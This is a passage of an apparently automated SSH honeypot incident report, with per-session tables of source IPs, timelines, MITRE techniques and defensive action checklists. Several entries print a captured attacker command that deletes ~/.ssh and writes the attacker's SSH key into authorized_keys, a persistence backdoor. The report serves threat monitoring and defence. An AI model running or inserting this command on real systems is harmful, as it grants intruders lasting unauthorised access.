| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:53:21` | `cowrie.session.connect` |
| `2026-04-08 06:53:21` | `cowrie.client.version` |
| `2026-04-08 06:53:21` | `cowrie.client.kex` |
| `2026-04-08 06:53:22` | `cowrie.login.success` |
| `2026-04-08 06:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c9f5fe6d08

| Field | Detail |
|---|---|
| **Source IP** | `1.94.220[.]55` |
| **First Seen** | 2026-04-08 06:56 |
| **Last Seen** | 2026-04-08 06:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:56:38` | `cowrie.session.connect` |
| `2026-04-08 06:56:38` | `cowrie.client.version` |
| `2026-04-08 06:56:38` | `cowrie.client.kex` |
| `2026-04-08 06:56:39` | `cowrie.login.success` |
| `2026-04-08 06:56:39` | `cowrie.session.params` |
| `2026-04-08 06:56:39` | `cowrie.command.input` |
| `2026-04-08 06:56:39` | `cowrie.command.failed` |
| `2026-04-08 06:56:39` | `cowrie.log.closed` |
| `2026-04-08 06:56:40` | `cowrie.session.params` |
| `2026-04-08 06:56:40` | `cowrie.command.input` |
| `2026-04-08 06:56:40` | `cowrie.session.file_download` |
| `2026-04-08 06:56:40` | `cowrie.log.closed` |
| `2026-04-08 06:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.94.220[.]55` to AbuseIPDB if not already reported
- [ ] Block `1.94.220[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc217d740983

| Field | Detail |
|---|---|
| **Source IP** | `1.94.220[.]55` |
| **First Seen** | 2026-04-08 06:56 |
| **Last Seen** | 2026-04-08 06:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:56:42` | `cowrie.session.connect` |
| `2026-04-08 06:56:42` | `cowrie.client.version` |
| `2026-04-08 06:56:42` | `cowrie.client.kex` |
| `2026-04-08 06:56:43` | `cowrie.login.success` |
| `2026-04-08 06:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.94.220[.]55` to AbuseIPDB if not already reported
- [ ] Block `1.94.220[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cee405650e9

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:56 |
| **Last Seen** | 2026-04-08 06:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:56:53` | `cowrie.session.connect` |
| `2026-04-08 06:56:53` | `cowrie.client.version` |
| `2026-04-08 06:56:53` | `cowrie.client.kex` |
| `2026-04-08 06:56:54` | `cowrie.login.success` |
| `2026-04-08 06:56:54` | `cowrie.session.params` |
| `2026-04-08 06:56:54` | `cowrie.command.input` |
| `2026-04-08 06:56:54` | `cowrie.command.failed` |
| `2026-04-08 06:56:55` | `cowrie.log.closed` |
| `2026-04-08 06:56:55` | `cowrie.session.params` |
| `2026-04-08 06:56:55` | `cowrie.command.input` |
| `2026-04-08 06:56:55` | `cowrie.session.file_download` |
| `2026-04-08 06:56:55` | `cowrie.log.closed` |
| `2026-04-08 06:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4062deab833d

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:56 |
| **Last Seen** | 2026-04-08 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:56:58` | `cowrie.session.connect` |
| `2026-04-08 06:56:58` | `cowrie.client.version` |
| `2026-04-08 06:56:59` | `cowrie.client.kex` |
| `2026-04-08 06:57:00` | `cowrie.login.success` |
| `2026-04-08 06:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3d4157abe4

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:58 |
| **Last Seen** | 2026-04-08 06:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:58:37` | `cowrie.session.connect` |
| `2026-04-08 06:58:37` | `cowrie.client.version` |
| `2026-04-08 06:58:37` | `cowrie.client.kex` |
| `2026-04-08 06:58:38` | `cowrie.login.success` |
| `2026-04-08 06:58:39` | `cowrie.session.params` |
| `2026-04-08 06:58:39` | `cowrie.command.input` |
| `2026-04-08 06:58:39` | `cowrie.command.failed` |
| `2026-04-08 06:58:39` | `cowrie.log.closed` |
| `2026-04-08 06:58:39` | `cowrie.session.params` |
| `2026-04-08 06:58:39` | `cowrie.command.input` |
| `2026-04-08 06:58:40` | `cowrie.session.file_download` |
| `2026-04-08 06:58:40` | `cowrie.log.closed` |
| `2026-04-08 06:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21334087be83

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:58 |
| **Last Seen** | 2026-04-08 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:58:43` | `cowrie.session.connect` |
| `2026-04-08 06:58:43` | `cowrie.client.version` |
| `2026-04-08 06:58:43` | `cowrie.client.kex` |
| `2026-04-08 06:58:44` | `cowrie.login.success` |
| `2026-04-08 06:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9a776c2804

| Field | Detail |
|---|---|
| **Source IP** | `27.112.78[.]223` |
| **First Seen** | 2026-04-08 06:59 |
| **Last Seen** | 2026-04-08 06:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:59:13` | `cowrie.session.connect` |
| `2026-04-08 06:59:13` | `cowrie.client.version` |
| `2026-04-08 06:59:13` | `cowrie.client.kex` |
| `2026-04-08 06:59:14` | `cowrie.login.success` |
| `2026-04-08 06:59:15` | `cowrie.session.params` |
| `2026-04-08 06:59:15` | `cowrie.command.input` |
| `2026-04-08 06:59:15` | `cowrie.command.failed` |
| `2026-04-08 06:59:15` | `cowrie.log.closed` |
| `2026-04-08 06:59:15` | `cowrie.session.params` |
| `2026-04-08 06:59:15` | `cowrie.command.input` |
| `2026-04-08 06:59:16` | `cowrie.session.file_download` |
| `2026-04-08 06:59:16` | `cowrie.log.closed` |
| `2026-04-08 06:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.112.78[.]223` to AbuseIPDB if not already reported
- [ ] Block `27.112.78[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a185fa6091

| Field | Detail |
|---|---|
| **Source IP** | `27.112.78[.]223` |
| **First Seen** | 2026-04-08 06:59 |
| **Last Seen** | 2026-04-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:59:18` | `cowrie.session.connect` |
| `2026-04-08 06:59:18` | `cowrie.client.version` |
| `2026-04-08 06:59:19` | `cowrie.client.kex` |
| `2026-04-08 06:59:20` | `cowrie.login.success` |
| `2026-04-08 06:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.112.78[.]223` to AbuseIPDB if not already reported
- [ ] Block `27.112.78[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0baf0465780

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:00 |
| **Last Seen** | 2026-04-08 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:00:23` | `cowrie.session.connect` |
| `2026-04-08 07:00:23` | `cowrie.client.version` |
| `2026-04-08 07:00:23` | `cowrie.client.kex` |
| `2026-04-08 07:00:24` | `cowrie.login.success` |
| `2026-04-08 07:00:25` | `cowrie.session.params` |
| `2026-04-08 07:00:25` | `cowrie.command.input` |
| `2026-04-08 07:00:25` | `cowrie.command.failed` |
| `2026-04-08 07:00:25` | `cowrie.log.closed` |
| `2026-04-08 07:00:26` | `cowrie.session.params` |
| `2026-04-08 07:00:26` | `cowrie.command.input` |
| `2026-04-08 07:00:26` | `cowrie.session.file_download` |
| `2026-04-08 07:00:26` | `cowrie.log.closed` |
| `2026-04-08 07:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2931ca7e73ee

| Field | Detail |
|---|---|
| **Source IP** | `212.88.48[.]17` |
| **First Seen** | 2026-04-08 07:00 |
| **Last Seen** | 2026-04-08 07:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:00:24` | `cowrie.session.connect` |
| `2026-04-08 07:00:24` | `cowrie.client.version` |
| `2026-04-08 07:00:24` | `cowrie.client.kex` |
| `2026-04-08 07:00:25` | `cowrie.login.success` |
| `2026-04-08 07:00:26` | `cowrie.session.params` |
| `2026-04-08 07:00:26` | `cowrie.command.input` |
| `2026-04-08 07:00:26` | `cowrie.command.failed` |
| `2026-04-08 07:00:26` | `cowrie.log.closed` |
| `2026-04-08 07:00:26` | `cowrie.session.params` |
| `2026-04-08 07:00:26` | `cowrie.command.input` |
| `2026-04-08 07:00:27` | `cowrie.session.file_download` |
| `2026-04-08 07:00:27` | `cowrie.log.closed` |
| `2026-04-08 07:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.88.48[.]17` to AbuseIPDB if not already reported
- [ ] Block `212.88.48[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1618c1381035

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:00 |
| **Last Seen** | 2026-04-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:00:29` | `cowrie.session.connect` |
| `2026-04-08 07:00:29` | `cowrie.client.version` |
| `2026-04-08 07:00:29` | `cowrie.client.kex` |
| `2026-04-08 07:00:30` | `cowrie.login.success` |
| `2026-04-08 07:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0780789591a4

| Field | Detail |
|---|---|
| **Source IP** | `212.88.48[.]17` |
| **First Seen** | 2026-04-08 07:00 |
| **Last Seen** | 2026-04-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:00:29` | `cowrie.session.connect` |
| `2026-04-08 07:00:29` | `cowrie.client.version` |
| `2026-04-08 07:00:29` | `cowrie.client.kex` |
| `2026-04-08 07:00:30` | `cowrie.login.success` |
| `2026-04-08 07:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.88.48[.]17` to AbuseIPDB if not already reported
- [ ] Block `212.88.48[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c894e84131

| Field | Detail |
|---|---|
| **Source IP** | `186.80.18[.]158` |
| **First Seen** | 2026-04-08 07:00 |
| **Last Seen** | 2026-04-08 07:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:00:31` | `cowrie.session.connect` |
| `2026-04-08 07:00:31` | `cowrie.client.version` |
| `2026-04-08 07:00:32` | `cowrie.client.kex` |
| `2026-04-08 07:00:33` | `cowrie.login.success` |
| `2026-04-08 07:00:34` | `cowrie.session.params` |
| `2026-04-08 07:00:34` | `cowrie.command.input` |
| `2026-04-08 07:00:34` | `cowrie.command.failed` |
| `2026-04-08 07:00:34` | `cowrie.log.closed` |
| `2026-04-08 07:00:35` | `cowrie.session.params` |
| `2026-04-08 07:00:35` | `cowrie.command.input` |
| `2026-04-08 07:00:35` | `cowrie.session.file_download` |
| `2026-04-08 07:00:35` | `cowrie.log.closed` |
| `2026-04-08 07:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.80.18[.]158` to AbuseIPDB if not already reported
- [ ] Block `186.80.18[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b349a2a64663

| Field | Detail |
|---|---|
| **Source IP** | `186.80.18[.]158` |
| **First Seen** | 2026-04-08 07:00 |
| **Last Seen** | 2026-04-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:00:39` | `cowrie.session.connect` |
| `2026-04-08 07:00:39` | `cowrie.client.version` |
| `2026-04-08 07:00:39` | `cowrie.client.kex` |
| `2026-04-08 07:00:40` | `cowrie.login.success` |
| `2026-04-08 07:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.80.18[.]158` to AbuseIPDB if not already reported
- [ ] Block `186.80.18[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92dc60ef478b

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:02 |
| **Last Seen** | 2026-04-08 07:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:02:16` | `cowrie.session.connect` |
| `2026-04-08 07:02:16` | `cowrie.client.version` |
| `2026-04-08 07:02:16` | `cowrie.client.kex` |
| `2026-04-08 07:02:17` | `cowrie.login.success` |
| `2026-04-08 07:02:18` | `cowrie.session.params` |
| `2026-04-08 07:02:18` | `cowrie.command.input` |
| `2026-04-08 07:02:18` | `cowrie.command.failed` |
| `2026-04-08 07:02:18` | `cowrie.log.closed` |
| `2026-04-08 07:02:18` | `cowrie.session.params` |
| `2026-04-08 07:02:18` | `cowrie.command.input` |
| `2026-04-08 07:02:19` | `cowrie.session.file_download` |
| `2026-04-08 07:02:19` | `cowrie.log.closed` |
| `2026-04-08 07:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc78e0eaaadb

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:02 |
| **Last Seen** | 2026-04-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:02:22` | `cowrie.session.connect` |
| `2026-04-08 07:02:22` | `cowrie.client.version` |
| `2026-04-08 07:02:22` | `cowrie.client.kex` |
| `2026-04-08 07:02:23` | `cowrie.login.success` |
| `2026-04-08 07:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab64bf81d46

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:04 |
| **Last Seen** | 2026-04-08 07:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
